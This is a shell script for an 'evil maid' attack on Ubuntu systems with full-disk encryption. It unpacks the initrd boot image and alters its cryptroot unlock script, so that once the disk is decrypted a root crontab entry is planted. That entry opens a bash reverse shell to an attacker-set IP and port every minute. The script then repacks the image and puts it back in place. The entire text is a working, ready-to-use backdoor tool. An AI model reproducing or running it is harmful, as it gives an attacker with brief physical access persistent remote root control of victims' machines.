#!/bin/sh

# Attack
IP="192.168.0.111"
PORT=8005

# Install/Run BinWalk to find line where "...compressed data, from Unix,.."
# and replace Decimal value here
SPLIT_LOC=4641792

# Veriify and paste the version after "initrd.img-" example: 5.1.3-9-generic
KERNEL_VERSION="#.#.#-#-generic"

# Constants do not change it !!!

FILE_NAME="initrd.img-$KERNEL_VERSION"
BLOCK_SIZE=512
NAME_MICRO="initrd.microcode"
NAME_IMAGE="image"
EVIL="evilmaid"
BOOT="/boot"
EXTRACT="extraction"
WORKING_PATH="/home/$USER/Desktop"
RETURN_PATH=$(pwd)

# Function
let COUNT=$SPLIT_LOC/$BLOCK_SIZE

# blah blah 
cd "$WORKING_PATH/"
mkdir -p $EVIL
cp "$RETURN_PATH/$FILE_NAME" "$WORKING_PATH/$EVIL/$FILE_NAME"

cd "$EVIL/"


# dd s
dd if="$FILE_NAME" bs=$BLOCK_SIZE count=$COUNT of=$NAME_MICRO

dd if="$FILE_NAME" bs=$SPLIT_LOC skip=1 of=$NAME_IMAGE

# extraction
mkdir -p $EXTRACT

mv $NAME_IMAGE ./$EXTRACT/
cd $EXTRACT
zcat $NAME_IMAGE | cpio -id

#rm $NAME_IMAGE

cd "scripts/local-top/"
sed -i '$ d' cryptroot

echo "
# backdoor
mount /dev/mapper/ubuntu--vg-root /tmp
echo -e \"*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'\" >> /tmp/etc/crontab
umount /tmp

exit 0" >> cryptroot

cd "$WORKING_PATH/$EVIL/$EXTRACT"

# generate package
find . | cpio -H newc -o | gzip -9 > package
mv package ../package
cd ..
cat $NAME_MICRO package > $FILE_NAME

cp $FILE_NAME $RETURN_PATH/$FILE_NAME

 

#rm $RRETURN_PATH/evilmaid.sh